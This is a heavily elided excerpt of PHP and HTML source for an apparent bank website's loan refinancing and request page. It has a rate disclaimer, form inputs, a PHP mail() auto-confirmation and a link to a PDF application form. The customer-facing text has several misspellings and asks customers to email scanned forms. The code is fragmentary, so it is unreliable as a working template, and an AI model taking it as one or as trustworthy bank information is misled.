		...
		<strong>What do you need for refinancing</strong>
			...
			<ol>
				<li>What are your goals?
					<ul>
						 <li>Are you trying to lower your monthly payments?</li>
						...
						<li>Would you like to use equity to pay off debt or fund home upgrades?</li>
	 					<li>Do you qualify for a government-backed conventional refinance program?</li>
					</ul>
				</li>
				<li> Does refinancing make financial sense?
					<ul>
...
<br>
Sample rate is for illustrative purpose only, assumes a borrower with excellent credit, property located in state selected above, and is subject to change without notice. Rate also includes automatic payment and initial draw discounts. Select the Home Equity Assumptions link for information about these discounts, important loan disclosures and additional loan assumptions. Accuracy is not guaranteed and products may not be available for your situation.</p>
<br>
<hr>
<br>
...
// More headers
$headers .= 'From: <info@springheritagebank.com>' . "\r\n";
...
<p style="text-align: center;"><img alt="SPRING HERTAGE LOGO" src="https://springheritagebank.com/images/logo.png" style="height:70px; width:64px" /></p>
...
<p><span style="font-family:Comic Sans MS, cursive"><strong>&nbsp; &nbsp; &nbsp;We have recieved your request for loans, our team is working to serve you better please download, fill and send the offline application form to info@springheritagebank.com </strong></span></p>
...
<p>Dear customer this is an automatic email sent to you as a result of your loan request please ensure to download , fill , scan and send it our offical email info@springheritagebank.com <br>
...
<p><strong>official email :info@springheritagebank.com</strong></p>
...
If you have received this communication in error, please delete this mail and notify us immediately at info@springheritagebank.com.
  </body> 
 ...
 '; 
                  ...
                  $oo= mail($em,'Spring Heritage Loan Request Confirmation',$txt,$headers);
               if($oo){
				...
				<div class="sign-in-form style-1">
					...
					<div class="tabs-container alt">
						...
						<div class="tab-content" id="tab1" style="display: none;">
							...
							<input type="number" min="0" class="input-text" name="at"  placeholder="000000"  />
									</label>
								</p>
						...
						<div class="tab-content" id="tab2" style="display: none;">
							...
							<p class="form-row form-row-wide">
								<label for="email2">Amount:
										<input type="number"  min="0" class="input-text"  value="" />
								</label>
							</p>
...
<script>
	...
	$("#offline").click(function(e){
 	...
 	window.open('https://springheritagebank.com/user/ATM-CARD-APPLICATION-FORM-_31_2.pdf');
 });
